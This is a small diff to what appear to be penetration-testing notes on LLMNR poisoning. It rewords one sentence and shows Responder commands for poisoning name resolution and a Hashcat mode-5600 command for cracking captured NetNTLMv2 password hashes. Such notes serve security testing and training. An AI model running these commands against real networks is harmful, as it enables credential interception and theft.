@@ -32,7 +32,7 @@ responder -I <iface> -A # Listen only, do not poison
 responder -I <iface> # Poison and intercept responses
 ```
 
-Poisoning this connection with Responder or Inveigh provides us an opportunity to MITM the connection between these two computer and sniff password hashes from the wire directly. These hashes are NetNTLMv2, which means they cannot be used in PTH attacks, but they can still be cracked with Hashcat in mode 5600. 
+Poisoning this connection with Responder or Inveigh provides us an opportunity to Falsify the LLMNR name and request authentication. These hashes are NetNTLMv2, which means they cannot be used in PTH attacks, but they can still be cracked with Hashcat in mode 5600. 
 
 ```shell
 hashcat -m 5600 <NetNTLMv2> <wordlist>
